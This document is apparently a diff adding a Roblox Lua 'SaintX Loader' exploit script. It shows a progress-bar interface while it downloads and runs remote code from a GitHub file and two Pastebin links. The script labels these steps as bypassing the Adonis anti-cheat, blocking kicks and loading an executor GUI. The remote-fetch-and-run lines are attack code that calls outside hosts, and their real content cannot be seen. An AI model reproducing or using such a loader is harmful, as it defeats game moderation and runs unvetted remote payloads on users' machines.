@@ -1,0 +1,112 @@
+--// Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+
+--// ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SaintX_Loader"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+--// Main Frame
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(0.5, 0, 0.22, 0)
+loadingFrame.Position = UDim2.new(0.25, 0, 0.4, 0)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+loadingFrame.BorderSizePixel = 0
+loadingFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner", loadingFrame)
+corner.CornerRadius = UDim.new(0, 12)
+
+--// Status Text
+local statusText = Instance.new("TextLabel", loadingFrame)
+statusText.Size = UDim2.new(1, -20, 0.4, 0)
+statusText.Position = UDim2.new(0, 10, 0.05, 0)
+statusText.Text = "Starting SaintX Loader..."
+statusText.TextColor3 = Color3.fromRGB(200, 200, 255)
+statusText.TextScaled = true
+statusText.Font = Enum.Font.GothamBold
+statusText.BackgroundTransparency = 1
+statusText.TextXAlignment = Enum.TextXAlignment.Left
+
+--// Percentage Text
+local percentText = Instance.new("TextLabel", loadingFrame)
+percentText.Size = UDim2.new(1, -20, 0.3, 0)
+percentText.Position = UDim2.new(0, 10, 0.4, 0)
+percentText.Text = "0%"
+percentText.TextColor3 = Color3.fromRGB(150, 255, 200)
+percentText.TextScaled = true
+percentText.Font = Enum.Font.GothamSemibold
+percentText.BackgroundTransparency = 1
+percentText.TextXAlignment = Enum.TextXAlignment.Right
+
+--// Progress Bar BG
+local barBG = Instance.new("Frame", loadingFrame)
+barBG.Size = UDim2.new(0.9, 0, 0.2, 0)
+barBG.Position = UDim2.new(0.05, 0, 0.72, 0)
+barBG.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+barBG.BorderSizePixel = 0
+Instance.new("UICorner", barBG)
+
+--// Progress Bar
+local bar = Instance.new("Frame", barBG)
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+bar.BorderSizePixel = 0
+Instance.new("UICorner", bar)
+
+--// Gradient
+local gradient = Instance.new("UIGradient", bar)
+gradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(170, 0, 255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(85, 0, 170))
+})
+
+--// Animate Loader
+task.spawn(function()
+	for i = 1, 100 do
+		bar:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Sine", 0.03, true)
+		percentText.Text = i .. "%"
+
+		-- Status Updates
+		if i == 10 then
+			statusText.Text = "Scanning for kick scripts..."
+		elseif i == 30 then
+			statusText.Text = "Bypassing Adonis..."
+		elseif i == 40 then
+			-- Adonis Bypass
+			pcall(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua"))()
+			end)
+		elseif i == 50 then
+			statusText.Text = "Bypassed Adonis."
+		elseif i == 60 then
+			statusText.Text = "Bypassing Kick..."
+		elseif i == 70 then
+			-- ✅ NEW Anti-Kick
+			pcall(function()
+				loadstring(game:HttpGet("https://pastebin.com/raw/WaffQuEF"))()
+			end)
+		elseif i == 80 then
+			statusText.Text = "Kick protection enabled."
+		elseif i == 95 then
+			statusText.Text = "Finalizing..."
+		end
+
+		task.wait(0.03)
+	end
+
+	-- Finish
+	statusText.Text = "SaintX Loaded"
+	wait(0.6)
+	screenGui:Destroy()
+
+	-- Load main executor GUI
+	pcall(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/bRcNR9g9"))()
+	end)
+end)
